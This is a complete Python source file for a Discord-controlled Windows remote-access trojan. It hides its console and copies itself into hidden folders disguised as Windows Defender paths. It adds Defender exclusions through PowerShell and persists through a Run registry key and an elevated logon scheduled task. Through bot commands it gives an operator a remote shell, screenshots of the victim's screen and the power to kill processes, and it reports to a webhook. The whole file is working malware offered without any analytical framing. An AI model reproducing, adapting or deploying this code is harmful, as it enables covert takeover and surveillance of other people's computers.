import os, sys, time, json, requests, subprocess, threading, winreg, ctypes, shutil, hashlib, uuid, platform, asyncio, tempfile
from datetime import datetime

WEBHOOK = "YOUR_WEBHOOK"
TOKEN = "YOUR_BOT_TOKEN"
class AutoSetup:
    def __init__(self):
        self.path = sys.argv[0]
        self.name = f"winsvc_{hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:8]}.py"
        self.locations = [
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows Defender', 'Platform', self.name),
            os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows', 'WebCache', self.name),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Network', 'Downloader', self.name)
        ]
        self.device_id = hashlib.md5(f"{platform.node()}{uuid.getnode()}".encode()).hexdigest()[:12]
    
    def hide(self, path):
        try: ctypes.windll.kernel32.SetFileAttributesW(path, 2)
        except: pass
    
    def install_deps(self):
        deps = ['discord.py', 'requests', 'psutil']
        for dep in deps:
            try: __import__(dep.replace('-', '_').split('[')[0])
            except:
                subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", dep], 
                             creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
    
    def exclude_from_defender(self):
        try:
            for loc in self.locations:
                dir_path = os.path.dirname(loc)
                subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{dir_path}"'], 
                             creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
                subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionProcess "{loc}"'], 
                             creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        except: pass
    
    def duplicate_self(self):
        for loc in self.locations:
            try:
                os.makedirs(os.path.dirname(loc), exist_ok=True)
                shutil.copy2(self.path, loc)
                self.hide(loc)
                self.hide(os.path.dirname(loc))
            except: pass
    
    def add_persistence(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, f"WinDef_{self.device_id}", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.locations[0]}"')
            winreg.CloseKey(key)
            
            subprocess.run(['schtasks', '/create', '/tn', f'Microsoft\\Windows Defender\\Update_{self.device_id}', 
                          '/tr', f'"{sys.executable}" "{self.locations[1]}"', '/sc', 'onlogon', '/rl', 'highest', '/f'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        except: pass
    
    def log(self, msg):
        try: requests.post(WEBHOOK, json={"content": f"`{self.device_id}`: {msg}"}, timeout=3)
        except: pass
    
    def setup(self):
        self.install_deps()
        self.exclude_from_defender()
        self.duplicate_self()
        self.add_persistence()
        self.log(f"✅ Installed to {len([l for l in self.locations if os.path.exists(l)])}/3 locations")
        
        for loc in self.locations:
            if os.path.exists(loc):
                subprocess.Popen([sys.executable, loc], creationflags=subprocess.CREATE_NO_WINDOW, shell=False)
                break

class DiscordBot:
    def __init__(self):
        self.setup = AutoSetup()
        self.log(f"🚀 Starting...")
        
        import discord
        from discord.ext import commands
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix="!", intents=intents)
        
        @self.bot.event
        async def on_ready():
            await self.bot.tree.sync()
            self.log(f"✅ Online | {platform.platform()}")
        
        @self.bot.tree.command(name="sysinfo", description="System info")
        async def sysinfo(interaction):
            import psutil
            info = f"""Device: {self.setup.device_id}
OS: {platform.platform()}
CPU: {psutil.cpu_percent()}%
RAM: {psutil.virtual_memory().percent}%
Disk: {psutil.disk_usage('C:/').percent}%"""
            await interaction.response.send_message(f"```{info}```", ephemeral=True)
        
        @self.bot.tree.command(name="shell", description="Run command")
        async def shell(interaction, cmd: str):
            await interaction.response.defer(ephemeral=True)
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, 
                                      creationflags=subprocess.CREATE_NO_WINDOW)
                output = result.stdout + result.stderr or "✅ Executed"
                await interaction.followup.send(f"```{output[-1900:]}```", ephemeral=True)
            except Exception as e:
                await interaction.followup.send(f"❌ {str(e)}", ephemeral=True)
        
        @self.bot.tree.command(name="screenshot", description="Take screenshot")
        async def screenshot(interaction):
            await interaction.response.defer(ephemeral=True)
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                img.save('sc.png')
                with open('sc.png', 'rb') as f:
                    await interaction.followup.send(file=discord.File(f, 'screenshot.png'))
                os.remove('sc.png')
            except:
                await interaction.followup.send("❌ Failed", ephemeral=True)
        
        @self.bot.tree.command(name="kill", description="Kill process")
        async def kill(interaction, name: str):
            await interaction.response.defer(ephemeral=True)
            import psutil
            killed = []
            for proc in psutil.process_iter(['name']):
                if name.lower() in proc.info['name'].lower():
                    try: proc.kill(); killed.append(proc.info['name'])
                    except: pass
            await interaction.followup.send(f"✅ Killed: {', '.join(killed) or 'None'}", ephemeral=True)
        
        @self.bot.tree.command(name="status", description="Check persistence")
        async def status(interaction):
            alive = [os.path.exists(l) for l in self.setup.locations]
            await interaction.response.send_message(
                f"✅ Locations active: {sum(alive)}/{len(alive)}\nDevice: `{self.setup.device_id}`", 
                ephemeral=True
            )
    
    def log(self, msg):
        self.setup.log(msg)
    
    def run(self):
        while True:
            try:
                self.bot.run(TOKEN)
            except:
                time.sleep(30)

def main():
    if platform.system() != "Windows":
        return
    
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    setup = AutoSetup()
    
    if not any(os.path.exists(loc) for loc in setup.locations):
        setup.setup()
    
    bot = DiscordBot()
    
    def heartbeat():
        while True:
            setup.log(f"❤️ Alive | {datetime.now().strftime('%H:%M')}")
            time.sleep(300)
    
    threading.Thread(target=heartbeat, daemon=True).start()
    bot.run()

if __name__ == "__main__":
    main()
      
